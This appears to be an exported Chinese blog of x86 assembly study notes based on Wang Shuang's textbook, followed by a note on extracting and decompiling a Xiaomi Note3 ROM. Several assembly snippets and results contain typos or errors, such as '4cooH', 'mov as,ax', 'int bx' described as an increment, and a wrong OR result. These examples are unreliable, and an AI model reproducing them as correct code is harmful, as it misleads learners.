<p> DOS进入到<code>masm</code>目录，输入如下指令: </p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">masm c:\1;            &#x2F;&#x2F;&quot;在当前路径下自动生成.obj的文件,分号不可省略&quot;</span><br></pre></td></tr></table></figure></li>
<li><p>简洁的连接过程</p>
<p> DOS进入到<code>masm</code>目录，输入如下指令: </p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">link 1;               &#x2F;&#x2F;&quot;当前路径下生成.EXE的文件,分号不可省略&quot;</span><br></pre></td></tr></table></figure>
<h3 id="操作系统的外壳"><a href="#操作系统的外壳" class="headerlink" title="操作系统的外壳"></a>操作系统的外壳</h3><p> 就CMD呗！全称command.com</p>
</li>
</ol>
</li>
</ol>
<h1 id="汇编程序从写出到执行的过程"><a href="#汇编程序从写出到执行的过程" class="headerlink" title="汇编程序从写出到执行的过程"></a>汇编程序从写出到执行的过程</h1><p>编程（Edit） –&gt;  1.asm  –&gt;   编译（masm）  –&gt;  1.obj  –&gt;  连接  –&gt;  1.exe  –&gt;  加载（command）  –&gt;  内存中的程序  –&gt;  运行（CPU）</p>
<p><strong><em>PS:本文仅是学习笔记，将自己认为重要的点记录下来；学习的途径是《汇编语言（第3版）》王爽著；</em></strong></p>
]]></content>
      <categories>
        <category>x86汇编</category>
      </categories>
      <tags>
        <tag>x86汇编</tag>
      </tags>
  </entry>
  <entry>
    <title>x86汇编学习笔记(0X09)</title>
    <url>/x86%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_0x09/</url>
    <content><![CDATA[<h2 id="程序执行过程的跟踪"><a href="#程序执行过程的跟踪" class="headerlink" title="程序执行过程的跟踪"></a>程序执行过程的跟踪</h2><p>为了观察程序运行的过程，可以用Debug，例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">debug 1.exe</span><br></pre></td></tr></table></figure>


<h2 id="整体流程"><a href="#整体流程" class="headerlink" title="整体流程"></a>整体流程</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">assume cs:codesg</span><br><span class="line"></span><br><span class="line">codesg segment</span><br><span class="line"></span><br><span class="line">	mov ax,2000H</span><br><span class="line">	mov ss,ax</span><br><span class="line">	mov sp,0</span><br><span class="line">	add sp,10</span><br><span class="line">	pop ax</span><br><span class="line">	pop bx</span><br><span class="line">	push ax</span><br><span class="line">	push bx</span><br><span class="line">	pop ax</span><br><span class="line">	pop bx</span><br><span class="line">	</span><br><span class="line">	mov ax,4c00H</span><br><span class="line">	int 21H</span><br><span class="line">	</span><br><span class="line">codesg ends</span><br><span class="line"></span><br><span class="line">end</span><br></pre></td></tr></table></figure>
<h1 id="BX-和loop指令"><a href="#BX-和loop指令" class="headerlink" title="[BX]和loop指令"></a>[BX]和loop指令</h1><h2 id="bx"><a href="#bx" class="headerlink" title="[bx]"></a>[bx]</h2><p>[bx]表示一个内存单元，它的偏移地址在bx寄存器中</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov ax,[bx]</span><br><span class="line">&#x2F;&#x2F;bx中存放的数据作为一个偏移地址EZ,段地址SA默认在ds中，将SA:EA处的数据送入ax中</span><br><span class="line">&#x2F;&#x2F;即：ax&#x3D;ds*16+bx</span><br></pre></td></tr></table></figure>


<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov bx,1</span><br><span class="line">int bx</span><br><span class="line">&#x2F;&#x2F;int bx的含义是bx中的内容加1</span><br></pre></td></tr></table></figure>
<p>[BX]的功能：</p>
<blockquote>
<p>mov ax,[bx]</p>
<p>bx中存放数据作为一个偏移地址EA，短地址SA中的数据默认在ds中，将SA:EA中的数据送入ax中，即：（ax）=（（ds）*16+（bx））</p>
</blockquote>
<h2 id="loop"><a href="#loop" class="headerlink" title="loop"></a>loop</h2><p>循环，loop指令的格式是：<code>loop 标号</code>，CPU执行loop指令的时候，要进行两步操作：</p>
<ol>
<li><p>​    cx=cx-1</p>
</li>
<li><p>判断cx中的值，不为0则转至标号处继续执行，为0则向下执行，例如：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">assume cd:code</span><br><span class="line">code segment</span><br><span class="line">	mov ax,2</span><br><span class="line">	</span><br><span class="line">	mov cx,11</span><br><span class="line">s:	add ax,ax</span><br><span class="line">	loop s</span><br><span class="line">	</span><br><span class="line">	mov ax,4cooH</span><br><span class="line">	int 21H</span><br><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
<h2 id="loop和-bx-的联合应用"><a href="#loop和-bx-的联合应用" class="headerlink" title="loop和[bx]的联合应用"></a>loop和[bx]的联合应用</h2><p> 例：</p>
<p> assume csLcode</p>
<p> code segment</p>
<p> ​        mov ax,0ffffh</p>
<p> ​        mov as,ax</p>
<p> ​        mov bx,0        ;初始化ds：bx指向ffff：0</p>
<p> ​        mov dx,0        ;初始化累加寄存器dx，（dx）=0</p>
<p> ​        mov cx,12       ;初始化循环计数寄存器cx，（cs）=12</p>
<p> s:     mov al,[bx[]</p>
<p> ​        mov ah,0</p>
<p> ​        add dx,ax        ;间接向dx中加上((ds)*16+(bx)单元的数值</p>
<p> ​        inc bx               ;ds:bx指向下一个单元</p>
<p> ​        loop s</p>
<p> ​        mov ax,4c00h</p>
<p> ​        int 21h</p>
<p> code ends</p>
<p> end</p>
</li>
</ol>
<h2 id="段前缀"><a href="#段前缀" class="headerlink" title="段前缀"></a>段前缀</h2><p>指令<code>mov ax,[bx]</code>中，段地址默认在ds中，在访问内存单元时可以指定段寄存器，例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov ax,ds:[bx]		&#x2F;&#x2F;段地址在ds寄存器中，偏移地址为在[bx]寄存器中</span><br><span class="line">mov ax,cs:[bx]</span><br><span class="line">mov ax,ss:[0]		&#x2F;&#x2F;段地址在ss寄存器中，偏移地址为0</span><br></pre></td></tr></table></figure>




<p><strong><em>PS:本文仅是学习笔记，将自己认为重要的点记录下来；学习的途径是《汇编语言（第3版）》王爽著；</em></strong></p>
]]></content>
      <categories>
        <category>x86汇编</category>
      </categories>
      <tags>
        <tag>x86汇编</tag>
      </tags>
  </entry>
  <entry>
    <title>x86汇编学习笔记(0X10)</title>
    <url>/x86%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_0x10/</url>
    <content><![CDATA[<h1 id="包含多个段的程序"><a href="#包含多个段的程序" class="headerlink" title="包含多个段的程序"></a>包含多个段的程序</h1><h2 id="在代码段中使用数据"><a href="#在代码段中使用数据" class="headerlink" title="在代码段中使用数据"></a>在代码段中使用数据</h2><blockquote>
<p>将0123h、0456h、0789h、0abch、0defh、0fedh、0cbah、0987h通过循环的方式累加。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">	dw 0123h,0456h,0789h,0abch,0defh,0fedh,0cbah,0987h</span><br><span class="line">	mov bx,0</span><br><span class="line">	mov ax,0</span><br><span class="line">	</span><br><span class="line">	mov cx,8</span><br><span class="line">s:	add ax,cs:[bx]</span><br><span class="line">	add bx,2</span><br><span class="line">	loop s</span><br><span class="line">	</span><br><span class="line">	mov ax,4c00h</span><br><span class="line">	int 21h</span><br><span class="line"></span><br><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
<p><code>dw</code>的含义是定义字形数据，全称是 <code>define word</code>，这里定义了8个字形数据，也就是16个字节。</p>
<p>数据的位置：程序在运行的时候CS中存放代码段的段地址。</p>
<p>偏移地址：DW定义的数据处于代码段的最开始，所以偏移地址为0，这8个代码段的偏移地址就是0、2、4、6、8、A、C、E处，程序运行时，他们的地址就是CS:0,CS:2…</p>
<h2 id="在代码段中使用栈"><a href="#在代码段中使用栈" class="headerlink" title="在代码段中使用栈"></a>在代码段中使用栈</h2><p>大致思路：程序运行时，定义的数据存放在CS:0~CS:F单元中，依次将这8个字单元入栈，然后再依次出栈到这8个字单元中，从而实现数据的逆序存放。</p>
<p>可以在程序中定义数据来取得一段空间，然后将这段空间当做栈来使用。</p>
<h2 id="将数据、代码、栈放入不同的段"><a href="#将数据、代码、栈放入不同的段" class="headerlink" title="将数据、代码、栈放入不同的段"></a>将数据、代码、栈放入不同的段</h2><p>当数据、代码、栈所需的空间超过64Kb时，就不能放在一个段里（一个段的容量不能超过64Kb，只针对于8086CPU）</p>
<p>定义段的例子：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">start:	mov ax,stack		</span><br><span class="line">		mov ss,ax		;设置栈顶ss:sp指向stack:20</span><br><span class="line">		mov sp,20h</span><br></pre></td></tr></table></figure>




<p><strong><em>PS:本文仅是学习笔记，将自己认为重要的点记录下来；学习的途径是《汇编语言（第3版）》王爽著；</em></strong></p>
]]></content>
      <categories>
        <category>x86汇编</category>
      </categories>
      <tags>
        <tag>x86汇编</tag>
      </tags>
  </entry>
  <entry>
    <title>x86汇编学习笔记(0X11)</title>
    <url>/x86%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_0x11/</url>
    <content><![CDATA[<h1 id="定位内存地址的方法"><a href="#定位内存地址的方法" class="headerlink" title="定位内存地址的方法"></a>定位内存地址的方法</h1><h2 id="and和or指令"><a href="#and和or指令" class="headerlink" title="and和or指令"></a>and和or指令</h2><ol>
<li><p>and指令：逻辑<strong>与</strong>指令，按位进行与运算</p>
<p> 例：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov	al,01100011B</span><br><span class="line">and al,00111011B</span><br></pre></td></tr></table></figure>
<p> 执行后：al=00100011B</p>
</li>
<li><p>or指令：逻辑<strong>或</strong>指令，按位进行或运算</p>
<p> 例：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov	al,01100011B</span><br><span class="line">or al,00111011B</span><br></pre></td></tr></table></figure>
<p> 执行后：al=011d11011B</p>
</li>
</ol>
<h2 id="以字符的形式给出的数据"><a href="#以字符的形式给出的数据" class="headerlink" title="以字符的形式给出的数据"></a>以字符的形式给出的数据</h2><p>在汇编程序中，用‘…’的方式指明数据是以字符的形式给出的，编译器将他们转化为ASCII码。例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov al,&#39;a&#39;</span><br><span class="line">mov bl,&#39;b&#39;</span><br></pre></td></tr></table></figure>
<h2 id="大小写转换的问题"><a href="#大小写转换的问题" class="headerlink" title="大小写转换的问题"></a>大小写转换的问题</h2><p>A的ASCII码是41H，a的ASCII码是61H，将41H加20就得到了a的ASCII值。要改变一个字符的大小写，实际就是改变他的ASCII码。</p>
<h2 id="SI和DI"><a href="#SI和DI" class="headerlink" title="SI和DI"></a>SI和DI</h2><p>SI和DI是8086CPU中和bx功能相近的寄存器，si和di不能够分成两个8位寄存器来使用。</p>
<h2 id="bx-si-和-bx-di"><a href="#bx-si-和-bx-di" class="headerlink" title="[bx+si]和[bx+di]"></a>[bx+si]和[bx+di]</h2><p>[bx+si]表示一个内存单元，它的偏移地址为(bx)+(si)     //即bx中的数值加上si中的数值。</p>
<p>指令mov ax,[bx+si]的含义如下：</p>
<p>将一个内存单元的内容送入ax寄存器中，这个内存单元的长度为2字节，偏移地址为[bx]中的数值加上[si]中的数值，段地址在ds中。</p>
<p>该指令也可以写成如下格式（常用）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov ax,[bx] [si]</span><br></pre></td></tr></table></figure>
<h2 id="bx-si-idata-和-bx-di-idata"><a href="#bx-si-idata-和-bx-di-idata" class="headerlink" title="[bx+si+idata]和[bx+di+idata]"></a>[bx+si+idata]和[bx+di+idata]</h2><p>[bx+si+idata]表示一个内存单元，它的偏移地址为(bx)+(si)+idata     //即bx中的数值加上si中的数值再加上idata。</p>
<p>指令mov ax,[bx+si+idata]的含义如下：</p>
<p>将一个内存单元的内容送入ax寄存器中，这个内存单元的长度为2字节，偏移地址为[bx]中的数值加上[si]中的数值再加上idata，段地址在ds中。</p>
<p>该指令也可以写成如下格式（常用）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov ax,[bx] [si].200</span><br><span class="line"></span><br><span class="line">mov ax,[bx+si+200]</span><br><span class="line"></span><br><span class="line">mov ax,200 [bx] [si]</span><br></pre></td></tr></table></figure>
<h2 id="不同寻址方式的灵活应用"><a href="#不同寻址方式的灵活应用" class="headerlink" title="不同寻址方式的灵活应用"></a>不同寻址方式的灵活应用</h2><ol>
<li>[idata]用一个常量来表示地址，可用于直接定位一个内存单元</li>
<li>[bx]用一个变量来表示地址，可用于间接定位一个内存单元</li>
<li>[bx+idata]用一个变量加一个常量来表示地址，可在一个其实地址的基础上，用变量间接定位一个内存单元</li>
<li>[bx+si]用两个变量表示地址</li>
<li>[bx+si+idata]和[bx+di+idata]用两个变量加一个常量表示地址</li>
</ol>
<p><strong><em>PS:本文仅是学习笔记，将自己认为重要的点记录下来；学习的途径是《汇编语言（第3版）》王爽著；</em></strong></p>
]]></content>
      <categories>
        <category>x86汇编</category>
      </categories>
      <tags>
        <tag>x86汇编</tag>
      </tags>
  </entry>
  <entry>
    <title>x86汇编学习笔记(0X12)</title>
    <url>/x86%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_0x12/</url>
    <content><![CDATA[<h1 id="数据处理的两个基本问题"><a href="#数据处理的两个基本问题" class="headerlink" title="数据处理的两个基本问题"></a>数据处理的两个基本问题</h1><p>自定义描述性符号：reg和sreg</p>
<p>reg表示一个寄存器，sreg表示一个段寄存器</p>
<p>reg的集合包括：sx,bx,cx,dx,ah,al,bh,bl,ch,cl,dh,dl,sp,bp,si,di</p>
<p>sreg的集合包括：ds，cs，ss，es</p>
<h2 id="div指令"><a href="#div指令" class="headerlink" title="div指令"></a>div指令</h2><p>div是除法指令，做div除法时应注意以下几个问题</p>
<ol>
<li><p>除数：有8位和16位两种，在一个reg或内存单元中</p>
</li>
<li><p>被除数：默认放在AX或DX和AX中，如果除数为8位，则被除数为16位。如果除数为16位，则被除数为32位，在DX和AX中存放，高位存放在DX中，低位存放在AX中。</p>
</li>
<li><p>结果：如果除数为8位，则AL储存商，AH储存余数。如果除数为16位，则AX储存商，DX储存余数。例：</p>
<p> 含义：(al)=(ax)/((ds)*16+0) 的商</p>
<p> ​           (ah)=(ax)/((ds)*16+0) 的余数</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">;编程，计算1001&#x2F;100</span><br><span class="line">mov ax,1001</span><br><span class="line">mov bl,100</span><br><span class="line">div bl</span><br><span class="line">;程序执行后，(al)&#x3D;10  (ah)&#x3D;1</span><br></pre></td></tr></table></figure>
<h2 id="伪指令-dd"><a href="#伪指令-dd" class="headerlink" title="伪指令 dd"></a>伪指令 dd</h2></li>
</ol>
<p>dd是用来定义dwordd（double word，双字）型数据的。</p>
<p>DB： 定义字节（1字节）</p>
<p>DW： 定义字（2字节）</p>
<p>DD： 定义双字（4字节）</p>
<h2 id="dup"><a href="#dup" class="headerlink" title="dup"></a>dup</h2><p>dup是一个操作符，同DB,DW,DD一样，也是由编译器识别处理的符号。</p>
<p>它和db，dw，dd等数据定义伪指令配合使用，用来进行数据的重复，比如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">db 3 dup (0)		;定义了三个字节，他们的值都是0，相当于db 0,0,0</span><br><span class="line"></span><br><span class="line">db 3 dup (0,1,2)	;定义了9个字节，它们是0,1,2,0,1,2,0,1,2</span><br></pre></td></tr></table></figure>
<h1 id="转移指令的原理"><a href="#转移指令的原理" class="headerlink" title="转移指令的原理"></a>转移指令的原理</h1><p>可以修改IP或同事修改CS和IP的指令统称转移指令。概括的讲，转移指令就是可以控制CPU执行内存中某处代码的指令。</p>
<p>8086CPU的转移指令有以下几类：</p>
<ol>
<li><p>只修改IP时，成为段内转移，比如<code>jmp ax</code></p>
<p> <em>jmp ax 可这样理解，bai执行du时，cs不变，zhiip的值变成ax的值。<br> 假设cs=2000，ip=0003，ax=1234，执行jmp ax 后，cs=2000，ip=1234，即cpu将跳转到2000:1234处执行指令dao。</em></p>
</li>
<li><p>同时修改CS和IP时，称为段间转移，比如jmp 1000:0</p>
</li>
</ol>
<h2 id="操作符offset"><a href="#操作符offset" class="headerlink" title="操作符offset"></a>操作符offset</h2><p>操作符offset是由编译器处理的符号，它的功能是取得标号的偏移地址。例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">start:	mov ax,offset start 	;相当于mov ax,0，因为start是代码段中的标号，标记的是代码段中的第一条指令，偏移地址为0</span><br><span class="line">s:	mov ax,offsets s		;标记的是代码段中的第二条指令，第一条指令长度为3个字节，s的偏移地址是3，所以相当于mov ax,3</span><br></pre></td></tr></table></figure>
<h2 id="jmp指令"><a href="#jmp指令" class="headerlink" title="jmp指令"></a>jmp指令</h2><p>jmp为无条件转移指令，可以只修改IP，也可以同时修改CS和IP</p>
<p>jmp指令要给出两种信息：</p>
<ol>
<li>转移地址的目的地址</li>
<li>转移的距离（段间转移、段内短转移、段内近转移）</li>
</ol>
<h2 id="依据位移进行转移的jmp指令"><a href="#依据位移进行转移的jmp指令" class="headerlink" title="依据位移进行转移的jmp指令"></a>依据位移进行转移的jmp指令</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jmp short 标号（转到标号处执行指令）</span><br></pre></td></tr></table></figure>
<p>这种格式的jmp指令实现的是段内短转移，对IP的修改范围是<code>-128~127</code>。</p>
<p>jmp指令中的<code>short</code>符号，说明指令进行的是短转移。jmp中的”标号“是代码段中的标号，指明了目的地。</p>
<blockquote>
<p>复盘一下CPU执行指令的过程：</p>
<ol>
<li>从CS:IP指向的内存单元读取指令，读取的指令进入指令缓冲器</li>
<li>(IP)=(IP)+所读取指令的长度，从而指向下一条指令；</li>
<li>执行指令。转到1，重复这个过程。</li>
</ol>
</blockquote>
<h2 id="转移的目的地址在指令中的jmp指令"><a href="#转移的目的地址在指令中的jmp指令" class="headerlink" title="转移的目的地址在指令中的jmp指令"></a>转移的目的地址在指令中的jmp指令</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jmp far ptr 标号</span><br></pre></td></tr></table></figure>
<p>这种格式实现的是段间转移，又称为远转移。</p>
<p>(CS)=标号所在段的段地址；(IP)=标号在段中的偏移地址</p>
<p><code>far ptr</code>指明了：指令用标号的<strong>段地址</strong>和<strong>偏移地址</strong>修改CS和IP</p>
<h2 id="转移地址在寄存器中的jmp指令"><a href="#转移地址在寄存器中的jmp指令" class="headerlink" title="转移地址在寄存器中的jmp指令"></a>转移地址在寄存器中的jmp指令</h2><p>指令格式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jmp 16位reg</span><br></pre></td></tr></table></figure>
<p>功能：(IP)=(16位reg)</p>
<h2 id="转移地址在内存中的jmp指令"><a href="#转移地址在内存中的jmp指令" class="headerlink" title="转移地址在内存中的jmp指令"></a>转移地址在内存中的jmp指令</h2><p>转移地址在内存中的jmp指令有两种格式：</p>
<ol>
<li><p>功能：从内存单元地址处存放着一个字，是转移的偏移地址。</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jmp word ptr 内存单元地址（段内转移）</span><br></pre></td></tr></table></figure>
<p> 内存单元地址可用任意寻址方式，例如：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jmp word ptr ds:[0]</span><br><span class="line">jmp word ptr [bx]</span><br></pre></td></tr></table></figure></li>
<li><p>功能:从内存单元地址开始处存放着两个字，高地址处的字是转移目的的段地址，低地址处是转移目的的偏移地址。</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jmp dword ptr 内存单元地址（段间转移）</span><br></pre></td></tr></table></figure>
<p> (CS)=(内存单元地址+2)</p>
<p> (IP)=(内存单元地址)</p>
<p> 内存单元地址可以用任意寻址方式，例如：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jmp dword ptr ds:[0]</span><br><span class="line">jmp dword ptr [bx]</span><br></pre></td></tr></table></figure>
<h2 id="jcxz指令"><a href="#jcxz指令" class="headerlink" title="jcxz指令"></a>jcxz指令</h2></li>
</ol>
<p>jcxz指令为有条件转移指令，所有的条件转移指令都时短转移，在对应的机器码中包含转移的位移，而不是目的地址。对IP的修改范围都是<code>-128~127</code></p>
<p>指令格式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jcxz 标号（如果(cx)&#x3D;0，转移到标号处执行）</span><br></pre></td></tr></table></figure>
<p>操作：当(cx)=0时，(IP)=(IP)+8位位移</p>
<p>8位位移=标号处的地址 - jcxz指令后第一个字节的地址；</p>
<p>8位位移的范围：<code>-128~127</code>，用补码表示</p>
<p>当cx!=0时，什么也不做，继续向下执行</p>
<p>“jcxz 标号”相当于 if cx == 0  –&gt;  jmp short 标号</p>
<h2 id="loop指令"><a href="#loop指令" class="headerlink" title="loop指令"></a>loop指令</h2><p>loo指令为循环指令，所有的循环指令都是<strong>短转移</strong></p>
<p>指令格式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">loop 标号（(cx)&#x3D;cx-1,如果cx!&#x3D;0，转移到标号处执行）</span><br></pre></td></tr></table></figure>
<p>操作：</p>
<ol>
<li>(cx)=(cx)-1</li>
<li>如果cx!=0，(IP)=(IP)+8位位移</li>
</ol>
<p><strong><em>PS:本文仅是学习笔记，将自己认为重要的点记录下来；学习的途径是《汇编语言（第3版）》王爽著；</em></strong></p>
]]></content>
      <categories>
        <category>x86汇编</category>
      </categories>
      <tags>
        <tag>x86汇编</tag>
      </tags>
  </entry>
  <entry>
    <title>x86汇编学习笔记(0X13)</title>
    <url>/x86%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_0x13/</url>
    <content><![CDATA[<h1 id="CALL和RET指令"><a href="#CALL和RET指令" class="headerlink" title="CALL和RET指令"></a>CALL和RET指令</h1><p>call和ret都是转移指令，它们都修改IP或CS和IP。</p>
<h2 id="ret和retf"><a href="#ret和retf" class="headerlink" title="ret和retf"></a>ret和retf</h2><p>ret指令用栈中的数据，修改IP的内容，从而实现近转移</p>
<p>retf用栈中的数据，修改CS和IP的内容，从而实现远转移</p>
<p>CPU执行ret指令时，进行下面两步操作：</p>
<ol>
<li>(IP)=((SS)*16+(SP))</li>
<li>(sp)=(sp)+2</li>
</ol>
<p>CPU执行retf指令时，进行下面四步操作：</p>
<ol>
<li>(IP)=((SS)*16+(SP))</li>
<li>(sp)=(sp)+2</li>
<li>(CS)=((SS)*16+(SP))</li>
<li>(sp)=(sp)+2</li>
</ol>
<p>如果用汇编语法解释ret和retf指令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">;ret指令：</span><br><span class="line">pop IP</span><br><span class="line"></span><br><span class="line">;retf指令</span><br><span class="line">pop IP</span><br><span class="line">pop CS</span><br></pre></td></tr></table></figure>
<h2 id="call指令"><a href="#call指令" class="headerlink" title="call指令"></a>call指令</h2><p>CPU执行call指令时，进行两步操作：</p>
<ol>
<li>将当前的IP 或 CS和IP压入栈</li>
<li>转移</li>
</ol>
<blockquote>
<p>call指令不能实现短转移，除此之外，call指令实现转移的方法和jmp指令的原理相同。</p>
</blockquote>
<p>不同命令释义：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">;call 标号  相当于：</span><br><span class="line">push IP</span><br><span class="line">jmp near ptr 标号</span><br><span class="line"></span><br><span class="line">;call far ptr 标号   实现的是段间转移，相当于：</span><br><span class="line">push IP</span><br><span class="line">push CS</span><br><span class="line">jmp far ptr 标号</span><br><span class="line"></span><br><span class="line">;call 16位reg，相当于：</span><br><span class="line">push IP</span><br><span class="line">jmp 16位reg</span><br><span class="line"></span><br><span class="line">;call word ptr 内存单元地址，相当于：</span><br><span class="line">push IP</span><br><span class="line">jmp word ptr 内存单元地址</span><br><span class="line"></span><br><span class="line">;call dword ptr 内存单元地址，相当于：</span><br><span class="line">push CS</span><br><span class="line">push IP</span><br><span class="line">jmp dword ptr 内存单元地址</span><br></pre></td></tr></table></figure>
<h2 id="mul指令"><a href="#mul指令" class="headerlink" title="mul指令"></a>mul指令</h2><p>mul是乘法指令，使用指令时注意以下两点：</p>
<ol>
<li>两个相乘的数要么都是8位，要么都是16位。如果是8位，一个默认放在AL中，另一个存放在reg中或内存字节单元中。如果是16位，一个默认放在AX中，另一个放在reg内存字单元中。</li>
<li>结果：如果是8位乘法，结果默认放在AX中；如果是16位乘法，高位默认放在DX中，低位放在AX中。</li>
</ol>
<p><strong><em>PS:本文仅是学习笔记，将自己认为重要的点记录下来；学习的途径是《汇编语言（第3版）》王爽著；</em></strong></p>
]]></content>
      <categories>
        <category>x86汇编</category>
      </categories>
      <tags>
        <tag>x86汇编</tag>
      </tags>
  </entry>
  <entry>
    <title>固件逆向学习笔记(0X01)</title>
    <url>/%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%9101/</url>
    <content><![CDATA[<p>网上看到有人逆向小米的note3的rom，固件逆向资料比较少，只看理论必不行，研究了研究后大体搞明白了，不明白的时候感觉好复杂好难，研究完后…就这？瞬间感觉拿不出手了，但是还是写一篇来记录一下，以后还可以返回来看一看。</p>
<h1 id="下载rom"><a href="#下载rom" class="headerlink" title="下载rom"></a>下载rom</h1><p>首先下载小米note3的rom，下载地址：</p>
<p><a href="https://www.miui.com/download.html">小米官网固件下载</a></p>
<p>选择好以后下载就ok</p>
<h1 id="br转换dat"><a href="#br转换dat" class="headerlink" title="br转换dat"></a>br转换dat</h1><blockquote>
<p>下载好之后解压zip包，按说解压后里边应该有system.img文件的，但是并没有，android5开始以后没有system.img文件了，而是改为system.new.dat，小米里边却是一个system.new.dat.br，于是上网继续学习br文件转换为dat文件，找到一个好用的工具，比较舒适，叫<a href="https://github.com/google/brotli/releases">brotli</a>，在brotli.exe路径下进入cmd，执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">brotli.exe -d system.new.dat.br</span><br></pre></td></tr></table></figure>

<p>之后会自动生成dat文件</p>
</blockquote>
<h1 id="dat转换img"><a href="#dat转换img" class="headerlink" title="dat转换img"></a>dat转换img</h1><p>得到dat文件之后就需要system.img文件了，网上各种方法都有，最终自己总结了一下最简便的一个工具，《ROM制作工具RomMakeTool》</p>
<p>使用方法如图</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2020/10/30/YwPxgziE3OmvHD1.png"></p>
<h1 id="img解压system目录"><a href="#img解压system目录" class="headerlink" title="img解压system目录"></a>img解压system目录</h1><p>得到system.img文件后就需要转换system文件目录了，从网上搜一个system.img转换工具，或者继续使用上边的工具</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2020/10/30/ZahlYAH95x7Xe6L.png"></p>
<h1 id="提取odex"><a href="#提取odex" class="headerlink" title="提取odex"></a>提取odex</h1><p>解压完后就会得到一个system目录，APK文件内如果有dex文件那就直接到dex转jar步骤，没有的话就需要找odex文件了，odex文件路径参考：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;system&#x2F;priv-app&#x2F;Settings&#x2F;oat&#x2F;arm64&#x2F;Settings.odex</span><br></pre></td></tr></table></figure>


<h1 id="odex转换dex"><a href="#odex转换dex" class="headerlink" title="odex转换dex"></a>odex转换dex</h1><p>找到odex文件后，需要现在工具来先转换成为samli文件，然后再将samli文件转换为dex格式。</p>
<ol>
<li><p>baksmali.jar 用于将odex解析成smali的工具。<br> 下载地址<a href="https://bitbucket.org/JesusFreke/smali/downloads/">baksmali.jar</a></p>
 <figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">java -jar baksmali.jar de Settings.odex</span><br></pre></td></tr></table></figure></li>
<li><p>smali.jar 将smali文件转出成dex文件</p>
<p> 下载地址<a href="https://bitbucket.org/JesusFreke/smali/downloads/">smali.jar 下载地址</a></p>
 <figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">java -jar smali.jar a out -o Settings.dex</span><br></pre></td></tr></table></figure>
<h1 id="dex转换jar"><a href="#dex转换jar" class="headerlink" title="dex转换jar"></a>dex转换jar</h1></li>
</ol>
<p>dex文件还不能直接打开，需要转换成jar格式，转化工具使用dex2jar。</p>
<p>命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java d2j-dex2jar.bat Settings.dex</span><br></pre></td></tr></table></figure>
<blockquote>
<p>在转换的时候可能会报错，提示版本不匹配之类的。查了查资料，发现原因并不是出现在dex2jar的工具版本中，是出在dex文件中，dex2jar工具定义dex头是35或36才行，然后打开dex文件看一下dex头，果然，dex头是39。</p>
<p>然后使用工具WinHex打开dex文件，将dex头改为36，再用dex2jar，成功生成jar文件。</p>
</blockquote>
<h1 id="jd-jui分析jar包"><a href="#jd-jui分析jar包" class="headerlink" title="jd-jui分析jar包"></a>jd-jui分析jar包</h1><p>最后就是使用jd-jui分析得到的jar包了<img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2020/10/30/IfOae5E4Y89JtHu.png"></p>
<p><em>PS:本文仅是学习笔记，将自己认为重要的点记录下来；</em></p>
<p>参考链接：<a href="https://blog.csdn.net/feiduclear_up/article/details/79443205">https://blog.csdn.net/feiduclear_up/article/details/79443205</a></p>
]]></content>
      <categories>
        <category>固件逆向</category>
      </categories>
      <tags>
        <tag>固件逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>固件逆向学习笔记(0X02)</title>
    <url>/%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%9102/</url>
